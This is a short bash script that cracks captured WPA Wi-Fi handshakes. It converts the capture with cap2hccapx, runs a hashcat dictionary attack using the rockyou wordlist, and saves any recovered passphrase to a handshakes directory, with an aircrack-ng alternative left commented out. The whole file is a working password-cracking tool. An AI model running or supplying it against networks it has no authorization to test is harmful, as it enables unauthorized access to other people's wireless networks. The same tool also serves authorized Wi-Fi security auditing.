#!/bin/bash

echo 'bruteforcing WPA'

/usr/lib/hashcat-utils/cap2hccapx.bin "$1" "$1.hccapx"
before=$(wc -l ~/.hashcat/hashcat.potfile | cut -d ' ' -f 1)
xterm -e "hashcat --force -a 0 -m 2500 '$1.hccapx' /usr/share/wordlists/rockyou.txt"
after=$(wc -l ~/.hashcat/hashcat.potfile | cut -d ' ' -f 1)
if [ $after -gt $before ]
 then tail -n 1 ~/.hashcat/hashcat.potfile | awk 'BEGIN {FS=":"};{print $NF}' > "../handshakes/${essid}.txt"
fi

#xterm -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt '$1'; read"
